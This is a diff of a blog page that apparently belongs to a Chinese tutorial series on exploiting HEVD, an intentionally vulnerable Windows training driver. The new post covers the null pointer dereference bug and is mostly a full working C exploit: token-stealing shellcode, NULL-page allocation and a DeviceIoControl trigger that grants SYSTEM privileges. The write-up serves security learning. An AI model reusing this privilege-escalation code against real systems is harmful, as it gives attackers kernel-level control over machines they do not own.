@@ -11,7 +11,7 @@
       <meta http-equiv="x-ua-compatible" content="ie=edge">
       
       
-        <link rel="canonical" href="https://50u1w4y.github.io/HEVD/homePage/">
+        <link rel="canonical" href="https://50u1w4y.github.io/HEVD/nullpointerDereference/">
       
       
         <meta name="author" content="50u1w4y">
@@ -40,7 +40,7 @@
     
     
       
-        <title>Home Page - 50u1w4y</title>
+        <title>（四）HEVD 空指针引用 - 50u1w4y</title>
       
     
     
@@ -109,7 +109,7 @@
             </span>
             <span class="md-header-nav__topic">
               
-                Home Page
+                （四）HEVD 空指针引用
               
             </span>
           
@@ -176,7 +176,7 @@
   
     <li class="md-tabs__item">
       
-        <a href="./" title="HEVD" class="md-tabs__link md-tabs__link--active">
+        <a href="../homePage/" title="HEVD" class="md-tabs__link md-tabs__link--active">
           HEVD
         </a>
       
@@ -257,18 +257,11 @@
           
           
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active">
-    
-    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-    
-    
-    <a href="./" title="Home Page" class="md-nav__link md-nav__link--active">
+  <li class="md-nav__item">
+    <a href="../homePage/" title="Home Page" class="md-nav__link">
       Home Page
     </a>
-    
   </li>
 
         
@@ -324,11 +317,18 @@
           
           
 
+  
 
-  <li class="md-nav__item">
-    <a href="../nullpointerDereference/" title="（四）HEVD 空指针引用" class="md-nav__link">
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+    <a href="./" title="（四）HEVD 空指针引用" class="md-nav__link md-nav__link--active">
       （四）HEVD 空指针引用
     </a>
+    
   </li>
 
         
@@ -410,12 +410,92 @@
               
                 
                 
-                  <h1>Home Page</h1>
+                  <h1>（四）HEVD 空指针引用</h1>
                 
-                <p>本系列的内容为HEVD环境下的漏洞利用学习</p>
-<p>HEVD 的全称为 HackSys Extreme Vulnerable Drive，是 github 上的一个项目。该项目是一个故意被设计为包含多种漏洞的驱动程序，以此供安全爱好者来提升他们在内核层面的漏洞利用能力。</p>
-<p>HEVD 涵盖了从简单的缓冲区溢出漏洞，到复杂的UAF、池溢出和条件竞争漏洞。这使得我们能够了解各种漏洞的利用技术。</p>
-<p>个人认为这是一个很适合像我一样的新手作为学习 Windows 的入门项目。由于本人水平有限，文章中出现的任何错误欢迎师傅们批评指正。</p>
+                <p><small>转载请注明出处哦 :  )</small></p>
+<p>不是，讲道理有上一篇的铺垫这次利用也太简单了吧。</p>
+<p>看到 NullPointerDereference.c 文件，我们的输入若不等于 MagicValue 的话 NullPointerDereference 又变为 NULL 指针，而后面不检查 NullPointerDereference 是否为 NULL 指针直接调用 NullPointerDereference-&gt;Callback()</p>
+<p>看到这里利用方法不就是上一篇中的一环吗？若有不清楚的朋友可以先做一下池溢出，这里就什么都不解释直接贴 exp 了。</p>
+<div class="codehilite"><pre><span></span><span class="c1">// nullpointerDereference.cpp : Defines the entry point for the console application.</span>
+<span class="c1">//</span>
+
+<span class="cp">#include</span> <span class="cpf">&quot;stdafx.h&quot;</span><span class="cp"></span>
+
+<span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;Memoryapi.h&gt;</span><span class="cp"></span>
+
+<span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">NtAllocateVirtualMemory_t</span><span class="p">)</span> <span class="p">(</span><span class="n">HANDLE</span>    <span class="n">ProcessHandle</span><span class="p">,</span>
+    <span class="n">PVOID</span>     <span class="o">*</span><span class="n">BaseAddress</span><span class="p">,</span>
+    <span class="n">ULONG_PTR</span> <span class="n">ZeroBits</span><span class="p">,</span>
+    <span class="n">PSIZE_T</span>   <span class="n">RegionSize</span><span class="p">,</span>
+    <span class="n">ULONG</span>     <span class="n">AllocationType</span><span class="p">,</span>
+    <span class="n">ULONG</span>     <span class="n">Protect</span><span class="p">);</span>
+
+<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+
+    <span class="s">&quot;</span><span class="se">\x90\x90\x90\x90</span><span class="s">&quot;</span>              <span class="c1">// NOP Sled</span>
+    <span class="s">&quot;</span><span class="se">\x60</span><span class="s">&quot;</span>                          <span class="c1">// pushad</span>
+    <span class="s">&quot;</span><span class="se">\x31\xc0</span><span class="s">&quot;</span>                      <span class="c1">// xor eax,eax</span>
+    <span class="s">&quot;</span><span class="se">\x64\x8b\x80\x24\x01\x00\x00</span><span class="s">&quot;</span>  <span class="c1">// mov eax,[fs:eax+0x124]</span>
+    <span class="s">&quot;</span><span class="se">\x8b\x40\x50</span><span class="s">&quot;</span>                  <span class="c1">// mov eax,[eax+0x50]</span>
+    <span class="s">&quot;</span><span class="se">\x89\xc1</span><span class="s">&quot;</span>                      <span class="c1">// mov ecx,eax</span>
+    <span class="s">&quot;</span><span class="se">\xba\x04\x00\x00\x00</span><span class="s">&quot;</span>          <span class="c1">// mov edx,0x4</span>
+    <span class="s">&quot;</span><span class="se">\x8b\x80\xb8\x00\x00\x00</span><span class="s">&quot;</span>      <span class="c1">// mov eax,[eax+0xb8]</span>
+    <span class="s">&quot;</span><span class="se">\x2d\xb8\x00\x00\x00</span><span class="s">&quot;</span>          <span class="c1">// sub eax,0xb8</span>
+    <span class="s">&quot;</span><span class="se">\x39\x90\xb4\x00\x00\x00</span><span class="s">&quot;</span>      <span class="c1">// cmp [eax+0xb4],edx</span>
+    <span class="s">&quot;</span><span class="se">\x75\xed</span><span class="s">&quot;</span>                      <span class="c1">// jnz 0x1a</span>
+    <span class="s">&quot;</span><span class="se">\x8b\x90\xf8\x00\x00\x00</span><span class="s">&quot;</span>      <span class="c1">// mov edx,[eax+0xf8]</span>
+    <span class="s">&quot;</span><span class="se">\x89\x91\xf8\x00\x00\x00</span><span class="s">&quot;</span>      <span class="c1">// mov [ecx+0xf8],edx</span>
+    <span class="s">&quot;</span><span class="se">\x61</span><span class="s">&quot;</span>                          <span class="c1">// popad</span>
+
+    <span class="s">&quot;</span><span class="se">\xC3</span><span class="s">&quot;</span>                          <span class="c1">// ret</span>
+                                    <span class="c1">//&quot;\xC2\x10\x00&quot;                  // ret 16</span>
+<span class="p">};</span>
+
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">LPVOID</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x3000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
+    <span class="n">RtlCopyMemory</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+
+    <span class="n">HMODULE</span> <span class="n">hmodule</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">&quot;ntdll.dll&quot;</span><span class="p">);</span>
+
+    <span class="n">NtAllocateVirtualMemory_t</span> <span class="n">NtAllocateVirtualMemory</span> <span class="o">=</span> <span class="p">(</span><span class="n">NtAllocateVirtualMemory_t</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hmodule</span><span class="p">,</span> <span class="s">&quot;NtAllocateVirtualMemory&quot;</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">NtAllocateVirtualMemory</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;getprocaddress failed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">PVOID</span> <span class="n">baseAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="mi">1</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">regionsize</span> <span class="o">=</span> <span class="mh">0x100</span><span class="p">;</span>
+    <span class="n">NTSTATUS</span> <span class="n">status</span> <span class="o">=</span> <span class="n">NtAllocateVirtualMemory</span><span class="p">((</span><span class="n">HANDLE</span><span class="p">)</span><span class="mh">0xFFFFFFFF</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">baseAddress</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regionsize</span><span class="p">,</span> <span class="mh">0x3000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">status</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;alloc failed,error code is:%u</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">status</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">((</span><span class="n">HANDLE</span><span class="p">)</span><span class="mh">0xFFFFFFFF</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="mh">0x04</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptr</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;write failed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kt">int</span> <span class="n">value</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="o">*</span><span class="n">payload</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">;</span>
+
+    <span class="n">HANDLE</span> <span class="n">hevDevice</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&quot;</span><span class="p">,</span> <span class="mh">0xC0000000</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">DWORD</span> <span class="n">lpBytesReturned</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hevDevice</span><span class="p">,</span> <span class="mh">0x22202b</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lpBytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="n">system</span><span class="p">(</span><span class="s">&quot;whoami&quot;</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+<p>： )</p>
+<hr />
+<p align='right'>2019.9.4</p>
                 
                   
                 
@@ -457,7 +537,7 @@
     <div class="md-footer-nav">
       <nav class="md-footer-nav__inner md-grid">
         
-          <a href="../.." title="Welcome" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+          <a href="../nonPagedpooloverflow/" title="（三）HEVD 非换页池溢出" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
             <div class="md-flex__cell md-flex__cell--shrink">
               <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
             </div>
@@ -466,19 +546,19 @@
                 <span class="md-footer-nav__direction">
                   Previous
                 </span>
-                Welcome
+                （三）HEVD 非换页池溢出
               </span>
             </div>
           </a>
         
         
-          <a href="../buildEnv/" title="HEVD 环境搭建" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+          <a href="../uninitializedStackVariable/" title="（五）HEVD 未初始化栈变量" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
             <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
               <span class="md-flex__ellipsis">
                 <span class="md-footer-nav__direction">
                   Next
                 </span>
-                HEVD 环境搭建
+                （五）HEVD 未初始化栈变量
               </span>
             </div>
             <div class="md-flex__cell md-flex__cell--shrink">
